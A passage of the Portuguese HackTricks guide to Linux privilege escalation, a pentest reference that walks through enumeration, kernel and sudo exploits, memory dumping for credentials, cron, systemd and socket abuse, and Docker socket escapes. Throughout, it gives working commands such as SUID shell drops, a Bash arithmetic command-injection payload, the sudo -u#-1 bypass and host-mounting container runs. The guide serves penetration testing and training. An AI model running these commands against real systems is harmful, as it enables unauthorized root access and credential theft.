# Elevação de Privilégios no Linux

{{#include ../../banners/hacktricks-training.md}}

## Informações do Sistema

### Informações do SO

Vamos começar a obter informações sobre o sistema operacional em execução
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se você **tem permissões de escrita em qualquer diretório dentro da variável `PATH`** pode ser capaz de hijack some libraries or binaries:
```bash
echo $PATH
```
### Informações do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalar privilégios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns já **compiled exploits** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Outros sites onde você pode encontrar alguns **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis desse site você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar por exploits do kernel são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute NA vítima, somente verifica exploits para kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez a versão do seu kernel esteja escrita em algum exploit do kernel e assim você terá certeza de que esse exploit é válido.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versão

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Consulte **smasher2 box of HTB** para um **exemplo** de como esta vuln poderia ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se você estiver dentro de um docker container, pode tentar escapar dele:


{{#ref}}
docker-security/
{{#endref}}

## Discos

Verifique **o que está montado e o que não está montado**, onde e por quê. Se algo não estiver montado, você pode tentar montá-lo e verificar se há informações privadas.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Além disso, verifique se **algum compilador está instalado**. Isso é útil se você precisar usar algum kernel exploit, pois é recomendado compilá-lo na máquina onde você vai usá-lo (ou em uma similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalating privileges…\
Recomenda-se verificar manualmente a versão dos softwares instalados mais suspeitos.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se tiver acesso SSH à máquina, você também pode usar **openVAS** para verificar se há software desatualizado ou vulnerável instalado na máquina.

> [!NOTE] > _Observe que esses comandos mostrarão muita informação que, na maior parte, será inútil; portanto, recomenda-se usar aplicações como OpenVAS ou similares que verifiquem se alguma versão de software instalada é vulnerável a exploits conhecidos_

## Processos

Dê uma olhada em **quais processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique possíveis [**electron/cef/chromium debuggers** em execução, você pode abusar disso para escalar privilégios](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecta esses verificando o parâmetro `--inspect` dentro da linha de comando do processo.\
Também **verifique seus privilégios sobre os binários dos processos**, talvez você possa sobrescrever algum.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados frequentemente ou quando um conjunto de requisitos é atendido.

### Memória do processo

Alguns serviços de um servidor salvam **credenciais em texto claro na memória**.\
Normalmente você precisará de **root privileges** para ler a memória de processos que pertencem a outros usuários, portanto isso costuma ser mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se que **como usuário comum você pode ler a memória dos processos que possui**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esta é a forma clássica de como ptracing funcionava.
> - **kernel.yama.ptrace_scope = 1**: apenas um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo) você poderia obter o Heap e procurar dentro dele por credenciais.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado PID, os **maps** mostram como a memória é mapeada dentro do espaço de endereçamento virtual desse processo; também mostram as **permissões de cada região mapeada**. O pseudo-arquivo **mem** **expõe a própria memória do processo**. A partir do arquivo **maps** sabemos quais **regiões de memória são legíveis** e seus offsets. Usamos essa informação para **seek into the mem file and dump all readable regions** para um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` é legível somente por **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump é uma versão para Linux da clássica ferramenta ProcDump do conjunto Sysinternals para Windows. Obtenha-o em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para despejar a memória de um processo você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e volcar o processo que pertence a você
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da memória do processo

#### Exemplo manual

Se você encontrar que o processo authenticator está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode fazer o dump do processo (veja as seções anteriores para encontrar diferentes maneiras de fazer o dump da memória de um processo) e procurar por credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais em texto claro da memória** e de alguns **arquivos bem conhecidos**. Requer privilégios de root para funcionar corretamente.

| Funcionalidade                                    | Nome do Processo     |
| ------------------------------------------------- | -------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Conexões FTP ativas)                      | vsftpd               |
| Apache2 (Sessões HTTP Basic Auth ativas)          | apache2              |
| OpenSSH (Sessões SSH ativas - uso de sudo)        | sshd:                |

#### Expressões Regulares de Busca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Agendados/Cron jobs

### Crontab UI (alseambusher) rodando como root – agendador baseado na web privesc

Se um painel web “Crontab UI” (alseambusher/crontab-ui) estiver rodando como root e estiver ligado apenas ao loopback, você ainda pode alcançá‑lo via SSH local port-forwarding e criar um job privilegiado para escalar privilégios.

Typical chain
- Descobrir porta acessível apenas via loopback (e.g., 127.0.0.1:8000) e o realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciais em artefatos operacionais:
- Backups/scripts com `zip -P <password>`
- unit systemd expondo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Estabelecer túnel e login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Criar um high-priv job e executar imediatamente (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimento
- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
- Enable audit/logging for on-demand job executions



Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" tem privilégios de escrita sobre /home/user_)

Se dentro deste crontab o usuário root tentar executar algum comando ou script sem definir o path. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um root shell usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um wildcard (Wildcard Injection)

Se um script é executado por root e tem um “**\***” dentro de um comando, você pode explorar isso para causar comportamentos inesperados (como privesc). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o wildcard for precedido por um caminho como** _**/some/path/\***_ **, ele não é vulnerável (mesmo** _**./\***_ **não é).**

Leia a página a seguir para mais wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash realiza parameter expansion e command substitution antes da avaliação aritmética em ((...)), $((...)) e let. Se um cron/parser executado como root ler campos de log não confiáveis e os alimentar em um contexto aritmético, um atacante pode injetar um command substitution $(...) que será executado como root quando o cron for executado.

- Why it works: Em Bash, as expansões ocorrem nesta ordem: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Faça com que texto controlado pelo atacante seja escrito no log parseado de modo que o campo com aparência numérica contenha um command substitution e termine com um dígito. Garanta que seu comando não escreva em stdout (ou redirecione) para que a aritmética permaneça válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Se você **puder modificar um cron script** executado como root, pode obter um shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado por root usa um **diretório onde você tem acesso total**, talvez seja útil apagar essa pasta e **criar um symlink para outra pasta** que aponte para um script controlado por você
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs frequentes

Você pode monitorar os processos para procurar processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa tirar proveito disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e remover os comandos que foram executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ele irá monitorar e listar todo processo que for iniciado).

### Cron jobs invisíveis

É possível criar um cronjob **inserindo um carriage return após um comentário** (sem o caractere de nova linha), e o cron job funcionará. Exemplo (observe o caractere carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`; se puder, você **poderia modificá-lo** para que ele **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário aguardar até que a máquina seja reiniciada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Tenha em mente que, se você tiver **permissões de escrita sobre binários executados por serviços**, você pode alterá-los para backdoors de forma que, quando os serviços forem reexecutados, os backdoors sejam executados.

### systemd PATH - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **write** em qualquer uma das pastas do caminho, pode ser capaz de **escalate privileges**. Você precisa procurar por **relative paths being used on service configurations** em arquivos como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Então, crie um executável com o mesmo nome que o relative path binary dentro do diretório PATH do systemd que você puder escrever, e quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor** será executado (usuários sem privilégios normalmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. **Timers** podem ser usados como alternativa ao cron, pois possuem suporte nativo a eventos baseados em tempo de calendário e a eventos de tempo monotônico, além de poderem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:
```bash
systemctl list-timers --all
```
### Temporizadores graváveis

Se você puder modificar um timer, pode fazê-lo executar algumas unidades existentes de systemd.unit (como uma `.service` ou uma `.target`)
```bash
Unit=backdoor.service
```
Na documentação você pode ler o que é a Unit:

> A unidade a ser ativada quando este timer expira. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não for especificado, esse valor por padrão corresponde a um .service que tem o mesmo nome da unidade timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unidade que é ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão você precisaria:

- Encontrar alguma unidade systemd (como um `.service`) que esteja **executando um binário gravável**
- Encontrar alguma unidade systemd que esteja **executando um caminho relativo** e para a qual você tenha **privilégios de escrita** sobre o **systemd PATH** (para se passar por esse executável)

Saiba mais sobre timers com `man systemd.timer`.

### **Ativar timer**

Para ativar um timer você precisa de privilégios root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **ativado** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos cliente-servidor. Eles utilizam arquivos de descritor padrão do Unix para comunicação entre computadores e são configurados através de arquivos `.socket`.

Sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro desse arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** o socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou número de porta para escutar, etc.)
- `Accept`: Recebe um argumento booleano. Se **true**, uma **instância de serviço é criada para cada conexão recebida** e somente o socket da conexão é passado para ela. Se **false**, todos os sockets de escuta são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é criada para todas as conexões. Esse valor é ignorado para datagram sockets e FIFOs, onde uma única unidade de serviço trata incondicionalmente todo o tráfego de entrada. **Padrão: false**. Por razões de desempenho, recomenda-se escrever novos daemons apenas de forma compatível com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Recebem uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da unidade **service** a **ativar** quando houver **tráfego de entrada**. Essa configuração só é permitida para sockets com `Accept=no`. Por padrão, aponta para o serviço que tem o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não é necessário usar essa opção.

### Writable .socket files

Se você encontrar um arquivo `.socket` **gravável**, pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e o backdoor será executado antes do socket ser criado. Portanto, **provavelmente será necessário esperar até que a máquina seja reiniciada.**\
_Observe que o sistema deve estar usando essa configuração de arquivo socket ou o backdoor não será executado_

### Writable sockets

Se você **identificar qualquer socket gravável** (_agora estamos falando de Unix Sockets e não dos arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Observe que pode haver alguns **sockets escutando requisições HTTP** (_não estou falando dos .socket files, mas dos arquivos que atuam como unix sockets_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responds with an HTTP** request, então você pode **communicate** com ele e talvez **exploit some vulnerability**.

### Docker Socket Gravável

O Docker socket, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e pelos membros do grupo `docker`. Possuir acesso de escrita a este socket pode levar a privilege escalation. A seguir um resumo de como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.

#### **Privilege Escalation with Docker CLI**

Se você tem acesso de escrita ao Docker socket, pode realizar privilege escalation usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Esses comandos permitem executar um container com acesso root ao sistema de arquivos do host.

#### **Usando Docker API Diretamente**

Em casos em que o Docker CLI não está disponível, o docker socket ainda pode ser manipulado usando a Docker API e comandos `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Outros

Observe que, se você tiver permissões de escrita sobre o docker socket por estar **inside the group `docker`** você tem [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Se a [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Se você puder usar o comando **`ctr`**, leia a página a seguir, pois **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Se você puder usar o comando **`runc`**, leia a página a seguir, pois **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado **inter-Process Communication (IPC) system** que permite que aplicações interajam e compartilhem dados de forma eficiente. Projetado para o sistema Linux moderno, oferece um framework robusto para diferentes formas de comunicação entre aplicações.

O sistema é versátil, suportando IPC básico que melhora a troca de dados entre processos, lembrando **enhanced UNIX domain sockets**. Além disso, ajuda na transmissão de eventos ou sinais, promovendo integração entre componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer com que um reprodutor de música silencie, melhorando a experiência do usuário. Adicionalmente, o D-Bus suporta um sistema de objetos remotos, simplificando solicitações de serviço e invocações de métodos entre aplicações, agilizando processos que tradicionalmente eram complexos.

O D-Bus funciona com um **allow/deny model**, gerenciando permissões de mensagens (chamadas de método, emissões de sinal, etc.) com base no efeito cumulativo de regras de política que correspondem. Essas políticas especificam interações com o bus, potencialmente permitindo privilege escalation através da exploração dessas permissões.

Um exemplo de tal política em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando permissões para o usuário root possuir, enviar para e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado se aplicam universalmente, enquanto políticas de contexto "default" se aplicam a todos não cobertos por outras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda como enumerate e exploit uma comunicação D-Bus aqui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

É sempre interessante enumerate a rede e descobrir a posição da máquina.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Verifique sempre os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você pode sniff traffic. Se conseguir, poderá obter algumas credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Verifique **who** você é, quais **privileges** você tem, quais **users** estão no sistema, quais podem **login** e quais têm **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grande

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa lhe conceder privilégios de root:


{{#ref}}
